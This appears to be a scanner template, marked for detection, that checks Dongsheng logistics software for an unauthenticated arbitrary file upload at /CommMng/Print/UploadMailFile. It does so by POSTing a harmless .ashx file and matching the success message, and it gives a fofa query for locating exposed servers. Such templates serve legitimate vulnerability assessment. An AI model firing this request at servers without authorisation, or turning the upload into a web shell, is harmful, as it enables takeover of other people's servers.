# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - body: |
      ------WebKitFormBoundary7MA4YWxkTrZu0gW
      Content-Disposition: form-data; name="LoadFile"; filename="{{randstr}}.ashx"
      Content-Type: application/octet-stream

      123

      ------WebKitFormBoundary7MA4YWxkTrZu0gW--
    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - success
          - 上传成功
        condition: and
    method: POST
    path:
      - '{{BaseURL}}/CommMng/Print/UploadMailFile'
id: dongsheng-uploadmailfile-fileupload
info:
  author: avic123
  description: |-
    东胜物流软件的/CommMng/Print/UploadMailFile接口存在任意文件上传漏洞，未经身份验证的攻击者可以通过该漏洞上传恶意脚本文件，从而控制目标服务器。
    fofa: body="dhtmlxcombo_whp.js"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 东胜物流软件CommMngPrintUploadMailFile 任意文件上传漏洞
  severity: critical
  tags: dongsheng,wuliu,fileupload,argus-import
